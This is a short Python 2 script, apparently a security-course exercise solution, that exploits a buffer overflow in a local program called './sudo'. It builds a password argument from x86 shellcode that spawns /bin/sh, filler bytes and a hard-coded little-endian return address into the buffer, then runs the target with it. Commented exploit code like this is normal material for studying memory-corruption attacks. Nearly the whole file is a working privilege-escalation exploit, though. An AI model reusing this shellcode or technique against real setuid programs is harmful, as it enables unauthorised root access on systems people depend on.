import os, sys


PATH_TO_SUDO = './sudo'


def run_shell():
	#big contains the buffer starting address, 
	big = "bfffdfd9".decode("hex")
	#the system expects binary in little-endian convention, so we need to flip the address
	little = big[::-1]
	#we insert our code, after it padding and then the address to the begining of the buffer
	password ='\xeb\x0f1\xc0\x83\xc0\x0b[1\xc9\x88K\x07\x89\xca\xcd\x80\xe8\xec\xff\xff\xff/bin/sh@AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJ'+little+'KKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXX'
	os.execl( PATH_TO_SUDO, PATH_TO_SUDO,password, "ls")
	raise NotImplementedError()


def main(argv):
    if not len(argv) == 1:
        print 'Usage: %s' % argv[0]
        sys.exit(1)

    run_shell()


if __name__ == '__main__':
    main(sys.argv)
